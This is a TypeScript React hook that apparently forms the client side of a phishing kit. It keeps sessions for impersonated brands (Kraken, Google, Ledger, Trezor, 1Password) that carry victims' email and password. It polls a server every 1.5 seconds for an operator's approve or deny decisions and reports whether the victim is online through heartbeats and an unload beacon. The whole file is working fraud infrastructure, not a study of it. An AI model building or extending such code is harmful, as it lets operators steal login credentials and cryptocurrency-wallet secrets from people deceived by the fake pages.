"use client"

import { useState, useEffect, useCallback, useRef } from "react"

export interface Session {
  id: string
  brand: "kraken" | "google" | "ledger" | "trezor" | "onepass"
  email?: string
  password?: string
  stage: string
  status: "active" | "waiting" | "approved" | "denied"
  adminMessage?: string
  data: Record<string, any>
  createdAt: string
  updatedAt: string
  userAgent: string
  isOnline: boolean
}

// Generate unique session ID with brand prefix
export function generateSessionId(brand: string): string {
  return `${brand}_${Math.random().toString(36).substring(2, 10)}${Date.now().toString(36)}`
}

// Hook for managing a user session
export function useSession(brand: Session["brand"]) {
  const [sessionId, setSessionId] = useState<string | null>(null)
  const [session, setSession] = useState<Session | null>(null)
  const [isReady, setIsReady] = useState(false)
  const pollRef = useRef<NodeJS.Timeout | null>(null)

  // Initialize session ID on mount
  useEffect(() => {
    const storageKey = `session_${brand}`
    let id = sessionStorage.getItem(storageKey)
    if (!id) {
      id = generateSessionId(brand)
      sessionStorage.setItem(storageKey, id)
    }
    setSessionId(id)
    setIsReady(true)
  }, [brand])

  // Save session to server
  const saveSession = useCallback(async (updates: Partial<Session>) => {
    if (!sessionId) return null

    try {
      const res = await fetch("/api/sessions", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          id: sessionId,
          brand,
          ...updates,
          updatedAt: new Date().toISOString(),
          userAgent: typeof navigator !== "undefined" ? navigator.userAgent : "",
          isOnline: true,
          isActive: true,
        }),
      })
      
      if (res.ok) {
        const data = await res.json()
        setSession(data.session)
        return data.session
      }
    } catch (err) {
      console.error("Failed to save session:", err)
    }
    return null
  }, [sessionId, brand])

  // Fetch current session from server
  const fetchSession = useCallback(async () => {
    if (!sessionId) return null

    try {
      const res = await fetch(`/api/sessions?id=${sessionId}`)
      if (res.ok) {
        const data = await res.json()
        if (data.session) {
          setSession(data.session)
          return data.session
        }
      }
    } catch (err) {
      console.error("Failed to fetch session:", err)
    }
    return null
  }, [sessionId])

  // Poll for session updates (for admin actions)
  useEffect(() => {
    if (!sessionId || !isReady) return

    // Initial fetch
    fetchSession()

    // Poll every 1.5 seconds
    pollRef.current = setInterval(fetchSession, 1500)

    return () => {
      if (pollRef.current) clearInterval(pollRef.current)
    }
  }, [sessionId, isReady, fetchSession])

  // Send heartbeat to keep session alive
  useEffect(() => {
    if (!sessionId || !isReady) return

    const heartbeat = setInterval(() => {
      fetch("/api/sessions", {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ id: sessionId, isOnline: true }),
      }).catch(() => {})
    }, 5000)

    // Mark offline on page unload
    const handleUnload = () => {
      navigator.sendBeacon("/api/sessions", JSON.stringify({ 
        id: sessionId, 
        isOnline: false,
        _beacon: true 
      }))
    }
    window.addEventListener("beforeunload", handleUnload)

    return () => {
      clearInterval(heartbeat)
      window.removeEventListener("beforeunload", handleUnload)
    }
  }, [sessionId, isReady])

  return {
    sessionId,
    session,
    isReady,
    saveSession,
    fetchSession,
  }
}
